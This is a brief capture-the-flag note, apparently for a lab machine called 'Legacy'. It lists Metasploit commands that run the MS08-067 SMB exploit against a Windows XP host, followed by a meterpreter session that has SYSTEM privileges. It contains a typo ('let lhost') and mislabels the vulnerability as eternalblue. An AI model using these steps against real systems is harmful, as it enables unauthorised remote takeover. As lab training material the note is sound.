## LEGACY 

OS: Windows XP (Windows 2000 LAN Manager)

eternalblue
[+] 10.10.10.4:445 - The target is vulnerable.

```
msfconsole
use windows/smb/ms08_067_netapi
set rhosts 10.10.10.4
let lhost 10.10.14.28
```

```
meterpreter > getuid
\Server username: NT AUTHORITY\SYSTEM
```
